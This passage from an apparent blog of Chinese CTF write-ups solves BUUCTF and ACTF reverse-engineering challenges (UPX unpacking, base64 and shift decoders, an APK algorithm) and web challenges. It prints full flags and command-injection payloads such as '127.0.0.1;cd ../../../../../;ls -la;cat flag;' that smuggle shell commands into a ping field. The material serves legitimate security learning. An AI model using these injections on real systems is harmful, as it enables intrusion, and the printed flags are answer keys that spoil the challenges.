class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解法很常规, 分析算法, 写出解密程序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> ciphertext[<span class="number">32</span>] = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>;</span><br><span class="line">	<span class="type">char</span> plaintext[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">char</span> c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++)	<span class="comment">//逐位穷举所有ASCII可打印字符</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> temp = c;</span><br><span class="line">			<span class="keyword">if</span> (c &gt; <span class="number">64</span> &amp;&amp; c &lt;= <span class="number">90</span>)</span><br><span class="line">				temp = (c - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c &gt; <span class="number">96</span> &amp;&amp; c &lt;= <span class="number">122</span>)</span><br><span class="line">				temp = (c - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">			<span class="keyword">if</span> (temp == ciphertext[i])</span><br><span class="line">				plaintext[i] = c;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ACTF&#123;%s&#125;&quot;</span>, plaintext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ACTF&#123;Cae3ar_th4_Gre@t&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]新年快乐</title>
    <url>/2022/01/20/%5BReverse%5D%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/</url>
    <content><![CDATA[<p>直接打开, 让输<strong>flag</strong>, 随便试一下</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202340448.png"
alt="image-20220120234044392" />
<figcaption aria-hidden="true">image-20220120234044392</figcaption>
</figure>
<p>首先<code>D.I.E</code>查壳</p>
<blockquote>
<p><code>D.I.E</code>查壳工具: <a
href="https://github.com/horsicq/Detect-It-Easy">Github</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202326577.png"
alt="image-20220120232650513" />
<figcaption aria-hidden="true">image-20220120232650513</figcaption>
</figure>
<p>可见是<code>UPX</code>壳, 就不上脱壳机了,
上<code>x32dbg</code>手工脱壳</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202344269.png"
alt="image-20220120234405168" />
<figcaption aria-hidden="true">image-20220120234405168</figcaption>
</figure>
<p>从入口往上翻能看到<code>pushad</code>,
一般<code>UPX</code>壳的的<code>pushad</code>和<code>popad</code>隔得不远,
往下翻就能找到,也可以使用<code>堆栈平衡法(esp定律法)</code>来找<code>popad</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202347918.png"
alt="image-20220120234745819" />
<figcaption aria-hidden="true">image-20220120234745819</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202358470.png"
alt="image-20220120235818368" />
<figcaption aria-hidden="true">image-20220120235818368</figcaption>
</figure>
<p>跟到0x401280里, 看起来没问题, 尝试脱壳,
使用<code>Scylla</code>插件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210001427.png"
alt="image-20220121000101326" />
<figcaption aria-hidden="true">image-20220121000101326</figcaption>
</figure>
<p><code>OEP</code>设置为0x401280再<code>IAT Autosearch</code>,
再<code>get import</code>, 一切正常, <code>dump</code>出exe,
再<code>fix dump</code>刚导出的exe</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210002674.png"
alt="image-20220121000248577" />
<figcaption aria-hidden="true">image-20220121000248577</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210003350.png"
alt="image-20220121000337291" />
<figcaption aria-hidden="true">image-20220121000337291</figcaption>
</figure>
<p>尝试打开, 正常运行, 说明脱壳成功</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210006458.png"
alt="image-20220121000655406" />
<figcaption aria-hidden="true">image-20220121000655406</figcaption>
</figure>
<p>再用<code>D.I.E</code>查看, 已经无壳了</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210007602.png"
alt="image-20220121000749537" />
<figcaption aria-hidden="true">image-20220121000749537</figcaption>
</figure>
<p>拖进<code>IDA</code>分析, F5查看伪代码,
就是比较输入与字符串"HappyNewYear!",
所以<strong>flag</strong>应该就是<code>flag&#123;HappyNewYear!&#125;</code><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210012782.png"
alt="image-20220121001208743" /></p>
<p>验证, <strong>flag</strong>正确</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210013420.png"
alt="image-20220121001339364" />
<figcaption aria-hidden="true">image-20220121001339364</figcaption>
</figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]reverse3</title>
    <url>/2022/01/21/%5BReverse%5Dreverse3/</url>
    <content><![CDATA[<p>无壳, 直接拖进<code>IDA</code>分析, F5查看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-188h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+0h] [ebp-188h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [esp+DCh] [ebp-ACh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v11; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">108</span>]; <span class="comment">// [esp+F4h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">28</span>]; <span class="comment">// [esp+160h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">8</span>]; <span class="comment">// [esp+17Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)i &gt;= <span class="number">0x64</span> )</span><br><span class="line">      j____report_rangecheckfailure();	<span class="comment">//应该是VS调试器加的代码,不管</span></span><br><span class="line">    Destination[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_41132F(<span class="string">&quot;please enter the flag:&quot;</span>, v7);</span><br><span class="line">  sub_411375(<span class="string">&quot;%20s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  v3 = j_strlen(Str);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_4110BE(Str, v3, v14);	<span class="comment">//注意这个sub_4110BE()函数, 作用未知</span></span><br><span class="line">      <span class="built_in">strncpy</span>(Destination, v4, <span class="number">0x28</span>u);	<span class="comment">//将sub_4110BE()返回值指向的字符拷到Destination数组</span></span><br><span class="line">  v11 = j_strlen(Destination);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v11; ++j )</span><br><span class="line">    Destination[j] += j;		<span class="comment">//字符移位</span></span><br><span class="line">  v5 = j_strlen(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Destination, Str2, v5) )	<span class="comment">//Str2=&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">    sub_41132F(<span class="string">&quot;rigth flag!\n&quot;</span>, v8);		</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_41132F(<span class="string">&quot;wrong flag!\n&quot;</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键在于<code>sub_4110BE()</code>这个函数,
菜鸡一时没看出来它是干啥的. 于是把它从<code>IDA</code>抠出来,
略作修改让它能跑起来, 命名为<code>unknown()</code>, 看看这个它的作用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* __cdecl <span class="title">unknown</span><span class="params">(<span class="type">char</span>* a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span>	<span class="comment">//第三个参数无用, 可删去</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+E0h] [ebp-2Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> v11; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">    <span class="type">void</span>* v12; <span class="comment">// [esp+F8h] [ebp-14h]</span></span><br><span class="line">    <span class="type">char</span>* v13; <span class="comment">// [esp+104h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!a1 || !a2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v9 = a2 / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)(a2 / <span class="number">3</span>) % <span class="number">3</span>)</span><br><span class="line">        ++v9;</span><br><span class="line">    v10 = <span class="number">4</span> * v9;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!v12)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v12, <span class="number">0</span>, v10 + <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> byte_41A144[<span class="number">4</span>];</span><br><span class="line">    <span class="type">char</span> aAbcdefghijklmn[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\x00&quot;</span>;</span><br><span class="line">    <span class="comment">//后来才知道,很明显这是一个base64的码表</span></span><br><span class="line">    v13 = a1;</span><br><span class="line">    v11 = a2;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (v11 &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            byte_41A144[i] = *v13;</span><br><span class="line">            --v11;</span><br><span class="line">            ++v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!i)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span> (i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">            v5 = v4 + <span class="number">1</span>;</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v5) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">            v4 = v5 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">            v6 = v4 + <span class="number">1</span>;</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v6) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">            v4 = v6 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">            v7 = v4 + <span class="number">1</span>;</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v7) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">            v4 = v7 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> a[] = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)<span class="built_in">unknown</span>(a, <span class="built_in">sizeof</span>(a)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//SGVsbG8gV29ybGQhAA==</span></span><br><span class="line"><span class="comment">//看起来是进行base64编码的函数</span></span><br></pre></td></tr></table></figure>
<p>知道了这个函数的作用,
接下来只需要处理一下字符的移位就可以还原出原文了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])-i)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(plaintext).decode())</span><br><span class="line"><span class="comment">#&#123;i_l0ve_you&#125;</span></span><br></pre></td></tr></table></figure>
<p>验证一下, 没毛病</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201212301676.png"
alt="image-20220121230115616" />
<figcaption aria-hidden="true">image-20220121230115616</figcaption>
</figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>[BUUCTF]简单注册器</title>
    <url>/2022/01/23/%5BReverse%5D%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/</url>
    <content><![CDATA[<p>又是个apk, 直接上<code>jadx</code>, 反编译<code>MainActivity</code>,
直接找到关键算法</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231736348.png"
alt="image-20220123173641201" />
<figcaption aria-hidden="true">image-20220123173641201</figcaption>
</figure>
<p><code>Ctrl+C</code>, <code>Ctrl+V</code>复刻</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> x[] = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>;</span><br><span class="line">    x[<span class="number">2</span>] = (<span class="type">char</span>)((x[<span class="number">2</span>] + x[<span class="number">3</span>]) - <span class="number">50</span>);</span><br><span class="line">    x[<span class="number">4</span>] = (<span class="type">char</span>)((x[<span class="number">2</span>] + x[<span class="number">5</span>]) - <span class="number">48</span>);</span><br><span class="line">    x[<span class="number">30</span>] = (<span class="type">char</span>)((x[<span class="number">31</span>] + x[<span class="number">9</span>]) - <span class="number">48</span>);</span><br><span class="line">    x[<span class="number">14</span>] = (<span class="type">char</span>)((x[<span class="number">27</span>] + x[<span class="number">28</span>]) - <span class="number">97</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="type">char</span> a = x[<span class="number">31</span> - i];</span><br><span class="line">        x[<span class="number">31</span> - i] = x[i];</span><br><span class="line">        x[i] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Java逆向</tag>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF2020 新生赛]BackupFile 1</title>
    <url>/2021/11/06/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile-1/</url>
    <content><![CDATA[<p>惯例, 用<code>dirsearch</code>扫描一下,
扫到个<code>index.php.bak</code></p>
<blockquote>
<p><code>dirsearch</code>项目地址: <a
href="https://github.com/maurosoria/dirsearch">Github</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062359818.png"
alt="image-20211106235918753" />
<figcaption aria-hidden="true">image-20211106235918753</figcaption>
</figure>
<p>源代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>审计代码,
当<code>$key</code>为数字且与<code>$str</code>弱相等的时候即可显示出<strong>flag</strong></p>
<blockquote>
<p><code>php</code>弱类型比较:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符串和数字比较使用==时,字符串会先转换为数字类型再比较</span><br><span class="line">var_dump(&#x27;a&#x27; == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0</span><br><span class="line">var_dump(&#x27;123a&#x27; == 123);//true，这里&#x27;123a&#x27;会被转换为123</span><br><span class="line"></span><br><span class="line">var_dump(&#x27;a123&#x27; == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。</span><br><span class="line">举例：</span><br><span class="line">var_dump(&#x27;123a1&#x27; == 123);//true</span><br><span class="line">var_dump(&#x27;1233a&#x27; == 123);//false</span><br></pre></td></tr></table></figure>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111091646185.png"
alt="image-20211109164631082" />
<figcaption aria-hidden="true">image-20211109164631082</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF2020 新生赛]Exec 1</title>
    <url>/2021/10/30/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1/</url>
    <content><![CDATA[<p>首先查看源代码,一无所获,尝试输入<code>127.0.0.1</code>, 有回显</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301304951.png"
alt="image-20211030130427904" />
<figcaption aria-hidden="true">image-20211030130427904</figcaption>
</figure>
<p>接着尝试组合命令<code>127.0.0.1&amp;&amp;ls</code>,失败</p>
<p>再尝试<code>127.0.0.1;ls</code>成功(实测这里也可以用<code>127.0.0.1||ls</code>,
但是用分号最稳妥, 不管前面的语句是否执行成功后面的语句都会执行)<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301303157.png"
alt="image-20211030130359106" /></p>
<p><code>127.0.0.1||ls&amp;&amp;cat index.php</code>输出<code>index.php</code>的源代码,
由于输出在网页上会自动解析成网页, 所以需要右键查看源代码才能看到<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301311590.png"
alt="image-20211030131153532" /></p>
<p>可见后台内容十分简单没有任何审查,
尝试构造payload到根目录寻找<strong>flag</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301315276.png"
alt="image-20211030131524211" />
<figcaption aria-hidden="true">image-20211030131524211</figcaption>
</figure>
<p>可以看到根目录下有一个<strong>flag</strong>文件,
我们只需要将它打印出来即可,将payload改为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;cat flag;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301317663.png"
alt="image-20211030131706602" />
<figcaption aria-hidden="true">image-20211030131706602</figcaption>
</figure>
<p><strong>flag</strong>到手~</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[GXYCTF2019]Ping Ping Ping 1</title>
    <url>/2021/10/30/%5BWeb%5DGXYCTF2019-Ping-Ping-Ping-1/</url>
    <content><![CDATA[<p>看页面提示, 显然是<code>get</code>请求提交参数, 输入一个ip试试水</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110310017150.png"
alt="image-20211031001710090" />
<figcaption aria-hidden="true">image-20211031001710090</figcaption>
</figure>
<p>正常回显, 来个<code>ls</code>看看</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110310018603.png"
alt="image-20211031001843555" />
<figcaption aria-hidden="true">image-20211031001843555</figcaption>
</figure>
<p>嚯, 好家伙, flag.php就在这里了,
这不得<code>cat flag.php</code>搞它一手?</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110310020463.png"
alt="image-20211031002002407" />
<figcaption aria-hidden="true">image-20211031002002407</figcaption>
</figure>
<p>还是Too Young, 空格被过滤不让用, 看样子肯定没那么简单,
那么就需要绕过空格</p>
<blockquote>
<p>常见的绕过空格过滤的方法:</p>
</blockquote>
